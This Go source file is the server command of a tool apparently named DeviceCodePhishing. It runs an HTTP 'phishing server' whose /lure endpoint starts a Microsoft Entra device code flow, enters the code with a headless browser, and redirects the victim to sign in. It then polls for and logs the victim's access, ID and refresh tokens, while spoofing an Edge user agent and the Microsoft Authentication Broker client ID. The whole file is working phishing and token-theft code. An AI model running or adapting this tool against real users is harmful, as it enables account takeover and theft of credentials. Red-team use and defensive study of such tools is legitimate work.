package cmd

import (
	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"time"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const DefaultTenant string = "common"
const DefaultResource string = "https://enrollment.manage.microsoft.com/"

var (
	address   string
	userAgent string
	clientId  string
	tenant    string
	resource  string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the servers listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent used by HeadlessBrowser & API calls")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId for requesting token")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant for requesting token")
	runCmd.Flags().StringVarP(&resource, "resource", "r", DefaultResource, "Resource requested")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long:  "Starts the phishing server. Listens by default on http://localhost:8080/lure",
	Run: func(cmd *cobra.Command, args []string) {
		// Set up a resource handler
		http.HandleFunc("/lure", lureHandler)

		host, port, err := net.SplitHostPort(address)

		if err != nil || port == "" {
			slog.Error("'"+address+"' is not a valid address", err)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server using Tenant:" + tenant + " ClientId:" + clientId)
		if host == "" {
			host = "localhost"
		}

		slog.Info("Use address " + host + ":" + port + "/lure")

		// Listen to HTTP connections and wait
		log.Fatal(server.ListenAndServe())
	},
}

func lureHandler(w http.ResponseWriter, r *http.Request) {
	slog.Info("Lure opened...")

	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

	//scopes := []string{"openid", "profile", "offline_access"}
	//deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
	deviceAuth, err := entra.RequestDeviceAuthV1(tenant, clientId, resource)
	if err != nil {
		slog.Error("Error during starting device code flow:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
	if err != nil {
		slog.Error("Error during headless browser automation:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(tenant, clientId, deviceAuth)
	http.Redirect(w, r, redirectUri, http.StatusFound)
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuthV1) {
	pollInterval := time.Duration(5) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Check for token: " + deviceAuth.UserCode)
		//result, err := entra.RequestToken(tenant, clientId, deviceAuth)
		result, err := entra.RequestTokenV1(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error(`"%#v"`, err)
			return
		}

		if result != nil {
			slog.Info("AccessToken for " + deviceAuth.UserCode + ": " + result.AccessToken)
			slog.Info("IdToken for " + deviceAuth.UserCode + ": " + result.IdToken)
			slog.Info("RefreshToken for " + deviceAuth.UserCode + ": " + result.RefreshToken)
			return
		}
	}
}
